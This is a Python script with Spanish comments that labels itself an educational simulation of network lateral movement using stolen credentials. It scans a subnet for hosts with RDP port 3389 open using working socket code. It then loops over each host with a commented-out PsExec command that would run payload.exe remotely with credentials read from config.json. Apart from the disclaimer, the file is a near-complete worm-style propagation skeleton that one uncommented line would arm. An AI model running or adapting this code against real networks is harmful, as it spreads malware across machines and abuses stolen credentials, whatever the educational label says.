# ADVERTENCIA: Este es un archivo simulado educativo. No ejecutar en sistemas reales.
# Simula la propagación lateral en red usando credenciales robadas.

import socket
import ipaddress
import json
import subprocess  # Simulado para PsExec

def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

def scan_network(subnet):
    vulnerable_hosts = []
    network = ipaddress.ip_network(subnet)
    for ip in network.hosts():
        if check_rdp_vulnerable(str(ip)):
            vulnerable_hosts.append(str(ip))
    return vulnerable_hosts

def check_rdp_vulnerable(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, 3389))
        sock.close()
        return result == 0
    except:
        return False

def lateral_movement(host, credentials):
    # Simular uso de PsExec o WMI para propagación
    print(f"Propagando a {host}...")
    # subprocess.run(['psexec', f'\\\\{host}', '-u', credentials['username'], '-p', credentials['password'], 'cmd.exe', '/c', 'payload.exe'])

if __name__ == "__main__":
    config = load_config()
    hosts = scan_network(config['subnet'])
    for host in hosts:
        lateral_movement(host, config['credentials'])